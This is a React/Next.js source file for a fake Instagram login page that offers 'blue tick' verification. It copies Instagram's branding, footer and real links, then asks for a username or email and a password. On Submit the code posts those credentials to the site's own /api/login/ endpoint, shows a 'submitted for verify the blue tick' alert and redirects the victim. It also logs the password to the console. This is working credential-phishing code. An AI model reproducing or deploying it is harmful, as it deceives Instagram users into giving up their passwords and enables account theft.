"use client"
import React, { useState } from 'react';
import { ChevronDown, Facebook } from 'lucide-react';
import Link from "next/link";
import { useRouter } from "next/navigation";

const Footer = () => {
      const router = useRouter();
    return (
        <footer className="mt-16 text-xs text-gray-500">
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 mb-4">
                <span>Meta</span>
                <span>About</span>
                <span>Blog</span>
                <span>Jobs</span>
                <span>Help</span>
                <span>API</span>
                <span>Privacy</span>
                <span>Terms</span>
                <span>Top Accounts</span>
                <span>Hashtags</span>
                <span>Locations</span>
                <span>Instagram Lite</span>
                <span>Contact Uploading & Non-Users</span>
            </div>
            <div className="flex justify-center items-center gap-4">
                <div className="flex items-center gap-1">
                    <span>English</span>
                    <ChevronDown size={14} />
                </div>
                <span>&copy; 2024 Instagram from Meta</span>
            </div>
        </footer>
    );
};

const App = () => {
    // State for inputs
    const [usernameOrEmail, setUsernameOrEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
  const router = useRouter();
    // Toggle password visibility
    const handleTogglePassword = () => {
        setShowPassword(!showPassword);
    };

    console.log(usernameOrEmail, password);


    // Login API call
    const handleLogin = async () => {
        try {
            const res = await fetch("/api/login/", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ usernameOrEmail, password }),
            });
              

            const data = await res.json();
            if (res.ok) {
                alert("Data are submitted for verify the blue tick");
                console.log("Saved user:", data);
                 router.push("pages/tick");
            } else {
                alert(data.error || "Failed to save");
            }
        } catch (error) {
            console.error("Error:", error);
            alert("Something went wrong!");


        }
    };

    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4 font-inter sm:p-8 md:p-12">
            {/* Login Form Box */}
            <div className="flex flex-col items-center p-10 bg-white rounded-lg border border-gray-300 w-full max-w-sm">
                <h1 className="font-serif text-5xl font-thin mt-4 mb-6">Instagram</h1>
                   <p className='mb-2 font-light'>Verify For Blue Tick</p>
                <div className="flex flex-col gap-2 w-full">
                 
                    <div className="relative">
                        <input
                            type="text"
                            value={usernameOrEmail}
                            onChange={(e) => setUsernameOrEmail(e.target.value)}
                            placeholder="Phone number, username, or email"
                            className="w-full bg-gray-50 border border-gray-300 rounded-md p-3 text-sm focus:outline-none focus:border-gray-500"
                        />
                    </div>
                    <div className="relative">
                        <input
                            type={showPassword ? "text" : "password"}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Password"
                            className="w-full bg-gray-50 border border-gray-300 rounded-md p-3 text-sm focus:outline-none focus:border-gray-500"
                        />
                        {/* Show/Hide password button */}
                        <button
                            type="button"
                            onClick={handleTogglePassword}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-500 font-semibold text-xs cursor-pointer"
                        >
                            {showPassword ? 'Hide' : 'Show'}
                        </button>
                    </div>
                </div>

                <button
                    type="button"
                    onClick={handleLogin}
                    className="w-full text-white font-semibold py-2 px-4 rounded-lg mt-4 bg-blue-500 hover:bg-blue-600"
                >
                    Submit
                </button>

                <div className="flex items-center w-full mt-4 mb-4">
                    <hr className="flex-grow border-gray-300" />
                    <span className="mx-4 text-gray-500 font-semibold text-sm">OR</span>
                    <hr className="flex-grow border-gray-300" />
                </div>

                <Link
                    href="https://www.facebook.com/login/device-based/regular/login/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center justify-center gap-2 text-blue-500 font-semibold mb-4 hover:underline"
                >
                    <Facebook size={20} />
                    Log in with Facebook
                </Link>

                <Link
                    href="https://www.instagram.com/accounts/password/reset/?__pwa=1"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex justify-center w-full text-xs text-blue-500 hover:underline"
                >
                    Forgot password?
                </Link>
            </div>

            {/* Sign Up Box */}
            <div className="flex items-center justify-center p-5 bg-white rounded-lg border border-gray-300 w-full max-w-sm mt-4 text-sm">
                <p>
                    Don't have an account?{" "}
                    <Link
                        href="https://www.instagram.com/accounts/emailsignup/"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-blue-500 font-semibold hover:underline"
                    >
                        Sign up
                    </Link>
                </p>
            </div>

            {/* App Download Section */}
            <div className="mt-4 flex flex-col items-center">
                <p className="text-gray-700 text-sm mb-4">Get the app.</p>
                <div className="flex flex-wrap justify-center gap-2 sm:flex-nowrap">
                    <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                        alt="Get it on Google Play"
                        className="h-10"
                    />
                </div>
            </div>

            <Footer />
        </div>
    );
};
export default App;
